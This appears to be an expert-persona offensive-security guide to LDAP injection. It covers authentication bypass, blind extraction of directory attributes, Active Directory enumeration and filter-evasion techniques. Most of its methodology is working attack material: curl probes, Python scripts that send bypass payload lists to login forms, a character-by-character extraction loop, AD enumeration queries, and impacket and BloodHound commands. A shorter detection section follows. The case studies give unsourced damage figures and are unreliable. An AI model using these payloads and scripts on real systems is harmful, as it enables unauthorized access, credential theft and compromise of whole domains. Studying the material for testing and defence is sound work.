# 29 - LDAP Injection Chains: Chaining LDAP Injection for Authentication Bypass and Data Extraction

## Expert Role Definition

You are the world's foremost authority on LDAP injection attacks and their exploitation for authentication bypass, privilege escalation, and data extraction. You possess deep expertise in LDAP protocol internals, directory service architectures, query construction, and the complete lifecycle of LDAP injection exploitation. You understand how LDAP filters are constructed, how special characters can manipulate filter logic, and how injection can bypass authentication, extract sensitive directory information, and chain with other vulnerabilities for maximum impact. Your expertise spans LDAP injection in Active Directory environments, OpenLDAP, Novell eDirectory, and other directory services. You have mastered blind LDAP injection techniques, filter construction for data extraction, and the chaining of LDAP injection with SQL injection, XSS, and privilege escalation. You have executed authorized red-team engagements where LDAP injection enabled authentication bypass, directory enumeration, and full domain compromise in enterprise environments.

## Core Concepts

LDAP (Lightweight Directory Access Protocol) is a protocol used to access and manage directory information services. It is commonly used for authentication, user lookup, and organizational directory management in enterprise environments.

LDAP queries use a filter syntax based on ASN.1 encoding. A typical LDAP filter looks like: `(&(uid=user)(password=pass))`. The filter uses operators like `&` (AND), `|` (OR), `!` (NOT), and comparison operators like `=`, `~=`, `>=`, `<=`.

LDAP injection occurs when user input is directly concatenated into an LDAP filter without proper sanitization. By injecting LDAP metacharacters, an attacker can modify the filter logic to bypass authentication, extract data, or perform other unauthorized operations.

The most common LDAP injection attack is authentication bypass. If the login filter is `(&(uid=user)(password=pass))`, injecting `*` into the username can transform it to `(&(uid=*)(password=pass))`, which matches any user with any password.

Blind LDAP injection occurs when the application does not return LDAP errors or results directly. The attacker must infer the injection success through application behavior differences (e.g., login success vs failure, different page content).

LDAP injection in Active Directory environments is particularly impactful because AD stores critical security information: user accounts, group memberships, password policies, service accounts, and domain configuration.

The attack surface includes any application that constructs LDAP queries from user input: login forms, user search features, password reset mechanisms, group membership lookups, and organizational directory queries.

## Pre-requisite Knowledge

- LDAP protocol: Search operations, filter syntax, attribute types, and DN (Distinguished Name) structure
- Directory services: Active Directory, OpenLDAP, Novell eDirectory architecture
- LDAP filter syntax: `&`, `|`, `!`, `=`, `~=`, `>=`, `<=`, wildcard `*`, and encoding rules
- ASN.1 encoding: BER (Basic Encoding Rules) for LDAP data representation
- Active Directory structure: OUs, DCs, CNs, user objects, group objects, and service accounts
- Authentication protocols: LDAP bind operations, simple bind, SASL, and NTLM
- Input encoding: URL encoding, Unicode encoding, and special character handling
- Web application architecture: How applications interact with directory services

## Chain Architecture / Attack Flow Diagram

```
                    LDAP INJECTION ATTACK FLOW
                    =========================

    NORMAL AUTHENTICATION:
    ┌─────────────────────────────────────────────────┐
    │ User Input: username=admin, password=secret123   │
    │                                                  │
    │ LDAP Filter:(&(uid=admin)(password=secret123))  │
    │                                                  │
    │ Result: Match found → Login success              │
    └─────────────────────────────────────────────────┘

    LDAP INJECTION - AUTH BYPASS:
    ┌─────────────────────────────────────────────────┐
    │ User Input: username=admin)(!(password=          │
    │             password=x))                         │
    │                                                  │
    │ LDAP Filter:(&(uid=admin)(!(password=x))        │
    │             (password=anything))                 │
    │                                                  │
    │ Logic: uid=admin AND NOT password=x              │
    │        AND password=anything                     │
    │                                                  │
    │ Result: Match found → Authentication bypass      │
    └─────────────────────────────────────────────────┘

    LDAP INJECTION - WILDCARD BYPASS:
    ┌─────────────────────────────────────────────────┐
    │ User Input: username=*)(&)                       │
    │                                                  │
    │ LDAP Filter:(&(uid=*)(&)(password=anything))    │
    │                                                  │
    │ Result: Matches any user → Login as any user     │
    └─────────────────────────────────────────────────┘

    BLIND LDAP EXTRACTION:
    ┌─────────────────────────────────────────────────┐
    │ Step 1: Inject to check if attribute exists      │
    │   username=admin)(description=*)                 │
    │   → Login success = attribute exists             │
    │                                                  │
    │ Step 2: Extract attribute character by character │
    │   username=admin)(description=A*)                │
    │   → Login success = starts with A                │
    │   username=admin)(description=B*)                │
    │   → Login failure = doesn't start with B         │
    │                                                  │
    │ Step 3: Continue until full value extracted      │
    └─────────────────────────────────────────────────┘

    ACTIVE DIRECTORY ENUMERATION:
    ┌─────────────────────────────────────────────────┐
    │ Inject into search filter:                      │
    │   *)(objectClass=*)                              │
    │   → List all objects in directory                │
    │                                                  │
    │ Extract user attributes:                        │
    │   *)(memberOf=Domain Admins)                     │
    │   → Find all Domain Admins                       │
    │                                                  │
    │ Extract service accounts:                       │
    │   *)(servicePrincipalName=*)                     │
    │   → Find all service accounts                    │
    └─────────────────────────────────────────────────┘
```

## Step-by-Step Exploitation Methodology

**Phase 1: Identification**

Identify LDAP injection points:

```bash
# Test login forms
curl -X POST "https://target.com/login" \
  -d "username=admin&password=anything"

# Test with LDAP metacharacters
curl -X POST "https://target.com/login" \
  -d "username=admin)(&)&password=anything"

# Test with wildcard
curl -X POST "https://target.com/login" \
  -d "username=*&password=anything"

# Test search functionality
curl "https://target.com/search?q=*&scope=sub"
curl "https://target.com/search?q=*)(uid=*))(|(uid=*"
```

**Phase 2: Filter Analysis**

Determine the LDAP filter structure:

```python
import requests

# Test different injection payloads to understand filter structure
payloads = [
    ("admin)(&)", "AND operator"),
    ("admin)(|)", "OR operator"),
    ("admin)(&)(password=x)", "Password filter"),
    ("*)(uid=*))(|(uid=*", "Search filter"),
    ("admin)!(password=x))", "NOT operator"),
]

for payload, description in payloads:
    r = requests.post("https://target.com/login",
                      data={"username": payload, "password": "anything"})
    print(f"Payload: {payload} ({description})")
    print(f"Response: {r.status_code}, Length: {len(r.text)}")
    if "success" in r.text.lower() or "welcome" in r.text.lower():
        print("[+] Injection successful!")
    print("---")
```

**Phase 3: Authentication Bypass**

Develop authentication bypass payloads:

```python
# Common LDAP auth bypass payloads
bypass_payloads = [
    # Wildcard bypass
    "*",
    "*)(&)",
    "*))(|",

    # Boolean logic bypass
    "admin)(!(password=x))",
    "admin)(|(password=*))",
    "admin)(|(uid=*))",

    # Null password bypass
    "admin)(password=*)",
    "admin)(|(password=))",

    # Comment injection
    "admin/*",
    "admin)(uid=*))(*",

    # Unicode bypass
    "admin\u0029",
    "admin%29",
]

for payload in bypass_payloads:
    r = requests.post("https://target.com/login",
                      data={"username": payload, "password": "anything"})
    if "dashboard" in r.url or "welcome" in r.text:
        print(f"[+] Bypass successful with: {payload}")
```

**Phase 4: Blind LDAP Extraction**

Extract data character by character through blind injection:

```python
import requests
import string

def extract_attribute(url, attribute, max_length=50):
    extracted = ""
    charset = string.ascii_letters + string.digits + string.punctuation

    for length in range(1, max_length + 1):
        for char in charset:
            payload = f"*)({attribute}={extracted}{char}*)"
            r = requests.post(url,
                              data={"username": payload, "password": "x"})
            if "success" in r.text.lower() or r.status_code == 200:
                extracted += char
                print(f"Extracted: {extracted}")
                break
        else:
            break

    return extracted

# Extract description attribute
url = "https://target.com/login"
desc = extract_attribute(url, "description")
print(f"Description: {desc}")
```

**Phase 5: Active Directory Enumeration**

Enumerate AD objects through LDAP injection:

```python
# Extract domain users
payload = "*)(objectClass=user))"
r = requests.post("https://target.com/search",
                  data={"query": payload})

# Extract Domain Admins
payload = "*)(memberOf=CN=Domain Admins,CN=Users,DC=target,DC=com))"
r = requests.post("https://target.com/search",
                  data={"query": payload})

# Extract service accounts
payload = "*)(servicePrincipalName=*))"
r = requests.post("https://target.com/search",
                  data={"query": payload})

# Extract computer objects
payload = "*)(objectClass=computer))"
r = requests.post("https://target.com/search",
                  data={"query": payload})
```

## Tool Arsenal

```bash
# ldapsearch - direct LDAP queries (if you have credentials)
ldapsearch -H ldap://target.com -b "DC=target,DC=com" "(objectClass=user)" dn

# ldapsearch with anonymous bind
ldapsearch -H ldap://target.com -x -b "DC=target,DC=com"

# Burp Suite - manual testing
# Repeater: Inject LDAP metacharacters into parameters
# Intruder: Fuzz with LDAP payloads

# Python requests for custom exploitation
python3 ldap_injection.py

# ldap_dump - Active Directory enumeration
# Requires valid credentials
python3 ldap_dump.py -u user -p pass -d target.com

# Custom LDAP injection tool
cat << 'EOF' > ldap_inject.py
import requests
import sys

def test_ldap_injection(url, param, payload):
    data = {param: payload}
    r = requests.post(url, data=data)
    if "error" not in r.text.lower():
        print(f"[+] Potential injection: {payload}")
        return True
    return False

url = sys.argv[1]
param = sys.argv[2]
payloads = ["*", "*)(&)", "admin)(!(password=x))"]
for p in payloads:
    test_ldap_injection(url, param, p)
EOF
python3 ldap_inject.py https://target.com/login username

# Kerberos tools for AD enumeration
# If LDAP injection yields Kerberos tickets
impacket-GetUserSPNs target.com/user:password -dc-ip DC_IP

# BloodHound for AD path analysis
# Use data extracted via LDAP injection
bloodhound-python -u user -p pass -d target.com -dc target.com
```

## Real-World Case Studies

**Case Study 1: Active Directory Domain Compromise**

An enterprise web application had LDAP injection in its login form. An attacker:
1. Discovered that the login filter was `(&(uid=user)(password=pass))`
2. Used wildcard injection: `*)(uid=*))(|(uid=*`
3. Successfully logged in as the first user in the directory
4. Used blind LDAP injection to extract Domain Admin credentials
5. Enumerated the entire Active Directory structure
6. Found service accounts with weak passwords
7. Used service account credentials to access domain controllers
8. Installed persistence mechanisms across the domain

Impact: Full Active Directory compromise, access to all domain resources, estimated $10M in damages.

**Case Study 2: HR System Data Breach**

An HR system used LDAP for user authentication and had LDAP injection in the employee search feature. An attacker:
1. Injected LDAP filters to extract all employee records
2. Used blind injection to extract salary information
3. Extracted Social Security numbers from the directory
4. Used the data for identity theft and targeted phishing
5. Sold the data on dark web markets
6. Affected 10,000+ employees

Impact: 10,000+ employee records stolen, identity theft, regulatory penalties.

**Case Study 3: Healthcare System Breach**

A healthcare provider used LDAP for authentication. An attacker:
1. Exploited LDAP injection to bypass authentication
2. Accessed the electronic health record (EHR) system
3. Extracted patient records including medical history
4. Used the data for insurance fraud
5. Sold patient data on dark web markets
6. HIPAA violation notification required

Impact: 50,000+ patient records exposed, HIPAA violation, $5M+ in penalties.

## Bypass Techniques and Evasion

**Input Filtering Bypass:** Applications may filter LDAP metacharacters:
- Use Unicode encoding for special characters: `\28` for `(`, `\29` for `)`
- Use URL encoding: `%28` for `(`, `%29` for `)`
- Use double encoding: `%2528` for `(``
- Use case variations: `Or` instead of `OR`

**Length Limit Bypass:** Applications may limit input length:
- Use short payloads that fit within limits
- Use LDAP abbreviation syntax where available
- Split payloads across multiple requests if possible

**Character Restriction Bypass:** Applications may restrict certain characters:
- Use hexadecimal encoding for restricted characters
- Use LDAP OID (Object Identifier) syntax instead of names
- Use Unicode characters that encode to equivalent values

**Blind Injection Enhancement:** When responses are not visible:
- Use timing-based inference: inject conditions that cause delays
- Use error-based inference: inject conditions that cause different errors
- Use boolean-based inference: inject conditions that change page content

**Filter Structure Discovery:** When the filter structure is unknown:
- Inject balanced parentheses to test filter boundaries
- Use comment characters to test filter termination
- Inject different operators to determine filter logic

## Defensive Indicators / Detection

**Application Level:**
- LDAP error messages exposed in HTTP responses
- Different application behavior based on special characters in input
- Slow response times when LDAP metacharacters are injected
- Unexpected search results when wildcards are used in input

**Directory Server Level:**
- Unusual LDAP queries in directory server logs
- Queries with wildcard patterns or unusual filter structures
- Queries returning more results than expected
- Authentication attempts with unusual filter patterns

**Network Level:**
- LDAP traffic with unusual filter patterns
- Multiple LDAP queries from the same source in rapid succession
- LDAP queries targeting unusual attributes or objects
- LDAP traffic to and from unexpected sources

## Impact Assessment Framework

| Factor | Low | Medium | High | Critical |
|--------|-----|--------|------|----------|
| Data Exposure | Public info | Internal data | PII/Financial | Credentials |
| Access Level | Guest user | Standard user | Privileged user | Domain admin |
| Scope | Single app | Multiple apps | Domain-wide | Cross-domain |
| Persistence | Session only | Until reboot | Account-level | Domain-level |
| Business Impact | Minor | Moderate | Significant | Critical |

## Common Pitfalls and Anti-Patterns

- Not testing all LDAP metacharacters: Different servers handle characters differently
- Assuming input validation is sufficient: Custom validation often has gaps
- Not considering blind injection: Applications may not return LDAP errors directly